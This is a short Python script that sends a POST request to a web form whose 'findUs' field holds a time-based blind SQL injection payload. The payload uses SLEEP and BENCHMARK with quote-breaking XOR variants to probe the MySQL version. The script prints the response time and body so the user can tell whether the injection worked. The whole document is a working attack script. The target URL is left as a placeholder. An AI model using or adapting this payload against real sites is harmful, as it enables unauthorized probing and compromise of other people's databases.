import requests
data = {'userEmail':"usman@cyberpersons.com",'status':'1','password':"cyberpersons'",'findUs':'IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*\'XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\'|"XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/'}


targetURL = '#'
result = requests.post(targetURL,data)

print (result.elapsed.total_seconds())
print (result.text)